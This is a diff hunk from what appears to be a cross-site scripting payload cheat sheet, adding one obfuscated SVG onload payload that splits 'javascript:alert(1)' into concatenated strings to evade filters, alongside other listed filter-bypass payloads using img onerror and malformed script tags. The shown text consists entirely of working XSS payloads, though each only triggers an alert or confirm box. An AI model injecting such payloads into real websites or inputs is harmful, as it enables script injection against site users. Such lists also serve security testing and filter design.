@@ -682,6 +682,7 @@ Bypass using weird encoding or native interpretation to hide the payload (alert(
 Exotic payloads
 
 ```javascript
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
 <img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
 <script>$=1,alert($)</script>
 <script ~~~>confirm(1)</script ~~~>
